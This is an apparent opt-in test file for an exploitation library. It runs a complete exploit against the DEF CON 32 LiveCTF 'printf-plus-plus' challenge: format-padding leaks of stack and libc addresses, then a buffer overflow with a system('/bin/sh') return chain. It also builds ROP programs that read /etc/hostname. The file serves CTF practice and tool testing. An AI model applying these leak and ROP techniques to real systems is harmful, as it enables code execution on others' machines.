"""Opt-in exploit coverage for DEF CON 32's i386 ``printf-plus-plus``.

The 2024 repository has no immutable release handout, so this test never
downloads or blesses a floating Docker rebuild.  Point
``PWNC_LIVECTF_PRINTF_PLUS_PLUS_ROOT`` at a handout directory containing the
challenge, loader, and exact libraries that were extracted from one audited
build.  The exploit derives every randomized address from challenge output;
``/proc` and debugger memory are deliberately not part of the transport.
"""

from __future__ import annotations

import os
import platform
import shutil
import signal
import sys
import unittest
from pathlib import Path

from pwnlib.context import context
from pwnlib.tubes.process import process
from pwnlib.util.packing import unpack

from payloads.angrop_backend import AngropDiscoveryOptions
from payloads.libc_rop import LibcROPBuilder, LibcROPStageKind
from payloads.model import Address, Image, Relro, RuntimeLayout
from payloads.pwntools_compat import ExactELFAdapter, pack_target_word

_ROOT_VALUE = os.environ.get("PWNC_LIVECTF_PRINTF_PLUS_PLUS_ROOT")
_ROOT = Path(_ROOT_VALUE).resolve() if _ROOT_VALUE else None
_OPT_IN = _ROOT is not None
_NATIVE_I386 = sys.platform.startswith("linux") and platform.machine().lower() in {
    "amd64",
    "i386",
    "i486",
    "i586",
    "i686",
    "x86_64",
}
_PROMPT = b'Enter format string: (eg "{:#x}")\n'
_FORMAT_BAD_BYTES = frozenset(b"\x00\x0a{}")


def _environment(*, library_path: Path | None = None) -> dict[str, str]:
    environment = {"PATH": os.defpath, "LANG": "C", "LC_ALL": "C"}
    if library_path is not None:
        environment["LD_LIBRARY_PATH"] = os.fspath(library_path)
    return environment


def _kill_process_group(tube: process) -> None:
    if tube.poll() is not None:
        return
    try:
        group = os.getpgid(tube.pid)
        if group != os.getpgrp():
            os.killpg(group, signal.SIGKILL)
    except (ProcessLookupError, PermissionError):
        pass


def _libc_main_return_offset(adapter: ExactELFAdapter) -> int:
    """Locate the instruction after libc's indirect call to ``main``."""

    elf = adapter.fresh_elf()
    try:
        start = int(elf.symbols["__libc_init_first"])
        code = bytes(elf.read(start, 0x100))
    finally:
        elf.close()
    # i386 glibc's startup frame invokes main with ``call *%eax`` and then
    # removes its four cdecl arguments.  Search the exact libc instead of
    # copying the stale offset from the historical reference exploit.
    signature = b"\xff\xd0\x83\xc4\x10"
    matches = [index for index in range(len(code)) if code.startswith(signature, index)]
    if len(matches) != 1:
        raise AssertionError(f"exact libc has {len(matches)} candidate main call sites")
    return start + matches[0] + 2


def _system_chain(adapter: ExactELFAdapter, libc_base: int) -> bytes:
    """Encode the fixed i386 cdecl frame; no gadget discovery is involved."""

    elf = adapter.fresh_elf(runtime_base=libc_base)
    try:
        words = (
            int(elf.symbols["system"]),
            int(elf.symbols["exit"]),
            next(elf.search(b"/bin/sh\0")),
        )
        return b"".join(pack_target_word(adapter.target, word) for word in words)
    finally:
        elf.close()


def _exploit(
    argv: list[str],
    root: Path,
    adapter: ExactELFAdapter,
    *,
    library_path: Path | None = None,
    attempts: int = 64,
) -> dict[str, int]:
    return_offset = _libc_main_return_offset(adapter)
    for _attempt in range(attempts):
        with context.local(arch="i386", bits=32, endian="little", os="linux", log_level="error"):
            tube = process(
                argv,
                cwd=os.fspath(root),
                env=_environment(library_path=library_path),
            )
        try:
            opening = tube.recvuntil(_PROMPT, timeout=5)
            if not opening.startswith(b"Format string exploit... but it's c++???\n"):
                raise AssertionError(f"unexpected challenge banner: {opening!r}")

            tube.sendline(b"{0:a>256}")
            first = tube.recvuntil(_PROMPT, timeout=5)[: -len(_PROMPT)]
            stack_pointer = int(unpack(first[256:260], 32, endianness="little", sign=False))

            tube.sendline(b"{0:a>372}")
            second = tube.recvuntil(_PROMPT, timeout=5)[: -len(_PROMPT)]
            libc_return = int(unpack(second[372:376], 32, endianness="little", sign=False))
            libc_base = libc_return - return_offset
            if libc_base & 0xFFF:
                raise AssertionError(f"derived libc base is not page aligned: {libc_base:#x}")

            chain = _system_chain(adapter, libc_base)
            # output starts at ebp-0x160.  At byte 0x154 the overflow replaces
            # the special GCC i386 saved-ecx epilogue slot.  The leaked pointer
            # is input at ebp-0x260, making input+0x268 exactly ebp+8.
            trailer = pack_target_word(adapter.target, stack_pointer + 0x268) + b"B" * 12 + chain
            if _FORMAT_BAD_BYTES.intersection(trailer):
                # ASLR can put a brace/newline byte in an otherwise valid
                # address.  Reject that concrete transport encoding and retry
                # a fresh process; do not mutate or inspect target memory.
                tube.sendline(b"")
                tube.wait_for_close(timeout=2)
                continue

            payload = b"{0:a>340}" + trailer
            if len(payload) >= 0x100:
                raise AssertionError("exploit no longer fits the challenge's fgets input")
            tube.sendline(payload)
            tube.recvuntil(_PROMPT, timeout=5)
            tube.sendline(b"")
            tube.sendline(b"printf 'PWNC_PRINTF_PLUS_PLUS_OK\\n'; exit")
            output = tube.recvall(timeout=5)
            if b"PWNC_PRINTF_PLUS_PLUS_OK\n" not in output:
                raise AssertionError(f"return chain did not reach the shell: {output!r}")
            return {
                "stack_pointer": stack_pointer,
                "libc_return": libc_return,
                "libc_base": libc_base,
            }
        finally:
            _kill_process_group(tube)
            tube.close()
    raise AssertionError(f"no format-safe ASLR layout appeared in {attempts} attempts")


@unittest.skipUnless(_OPT_IN, "set PWNC_LIVECTF_PRINTF_PLUS_PLUS_ROOT to an audited handout directory")
class LiveCTFPrintfPlusPlusTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        assert _ROOT is not None
        cls.root = _ROOT
        required = ("challenge", "libc.so.6", "ld-linux.so.2", "libstdc++.so.6", "libgcc_s.so.1", "libm.so.6")
        missing = [name for name in required if not (cls.root / name).is_file()]
        if missing:
            raise unittest.SkipTest(f"handout root is missing: {', '.join(missing)}")
        cls.challenge = ExactELFAdapter.from_file(cls.root / "challenge")
        cls.libc = ExactELFAdapter.from_file(cls.root / "libc.so.6")

    def test_exact_artifacts_and_composable_libc_rop(self) -> None:
        self.assertEqual(self.challenge.target.bits, 32)
        self.assertEqual(self.challenge.target.pwntools_arch, "i386")
        self.assertTrue(self.challenge.mitigations.pie)
        self.assertTrue(self.challenge.mitigations.nx)
        self.assertIs(self.challenge.mitigations.relro, Relro.FULL)
        self.assertFalse(self.challenge.mitigations.canary)

        layout = RuntimeLayout(libc_base=0x40ADA000, stack_base=0x40800000)
        chain_base = 0x40800CA0
        sendfile = LibcROPBuilder.from_file(self.root / "libc.so.6", b"/etc/hostname")
        sendfile_program = sendfile.compose(
            sendfile.open(),
            sendfile.sendfile(1, 3, 0x100),
            sendfile.exit(43),
        )
        lowered_sendfile = sendfile_program.lower(
            layout,
            chain_base=chain_base,
            options=AngropDiscoveryOptions(processes=1),
            timeout=30,
        )
        self.assertEqual(
            sendfile_program.operations,
            (LibcROPStageKind.OPEN, LibcROPStageKind.SENDFILE, LibcROPStageKind.EXIT),
        )
        self.assertTrue(lowered_sendfile.data.endswith(b"/etc/hostname\0"))
        self.assertEqual(lowered_sendfile.backend, "angrop")
        self.assertTrue(lowered_sendfile.backend_result)
        self.assertEqual(lowered_sendfile.as_payload().metadata["libc_sha256"], self.libc.identity.sha256)

        scratch = Address(0x2000, Image.STACK, "challenge stack scratch")
        orw = LibcROPBuilder.from_file(
            self.root / "libc.so.6",
            b"/etc/hostname",
            writable_area=scratch,
            writable_size=0x1000,
        )
        orw_program = orw.compose(orw.open(), orw.read(3, 0x100), orw.write(1, 0x100), orw.exit(44))
        lowered_orw = orw_program.lower(
            layout,
            chain_base=chain_base,
            options=AngropDiscoveryOptions(processes=1),
            timeout=30,
        )
        self.assertEqual(
            orw_program.operations,
            (
                LibcROPStageKind.OPEN,
                LibcROPStageKind.READ,
                LibcROPStageKind.WRITE,
                LibcROPStageKind.EXIT,
            ),
        )
        self.assertEqual(orw_program.external_placements[0].data, b"/etc/hostname\0")
        self.assertEqual(lowered_orw.backend, "angrop")
        self.assertTrue(lowered_orw.backend_result)

        # Both exact libc call programs are valid, but this particular
        # vulnerable formatter cannot transport their required NUL words.
        # The separately executed system chain below is its honest bad-byte
        # adaptation; generation never pretends the ORW programs executed.
        self.assertIn(0, lowered_sendfile.data)
        self.assertIn(0, lowered_orw.data)

    @unittest.skipUnless(_NATIVE_I386, "native i386 execution requires a Linux x86 host")
    def test_leak_derived_chain_executes_via_direct_i386_execve(self) -> None:
        # Invoke the challenge itself.  On an x86-64 host the kernel enters its
        # native i386 compatibility path through the ELF's /lib/ld-linux.so.2
        # interpreter; pwnc does not insert qemu or invoke the loader as argv[0].
        # LD_LIBRARY_PATH selects the audited handout libraries while retaining
        # that direct kernel execve path.
        argv = [os.fspath(self.root / "challenge")]
        result = _exploit(
            argv,
            self.root,
            self.libc,
            library_path=self.root,
        )
        self.assertEqual(result["libc_return"] - result["libc_base"], _libc_main_return_offset(self.libc))

    def test_leak_derived_chain_executes_under_qemu_i386(self) -> None:
        qemu = os.environ.get("PWNC_QEMU_I386") or shutil.which("qemu-i386")
        if qemu is None:
            self.skipTest("qemu-i386 is unavailable")
        argv = [
            qemu,
            os.fspath(self.root / "ld-linux.so.2"),
            "--inhibit-cache",
            "--library-path",
            os.fspath(self.root),
            os.fspath(self.root / "challenge"),
        ]
        result = _exploit(argv, self.root, self.libc)
        self.assertEqual(result["libc_return"] - result["libc_base"], _libc_main_return_offset(self.libc))


if __name__ == "__main__":
    unittest.main()
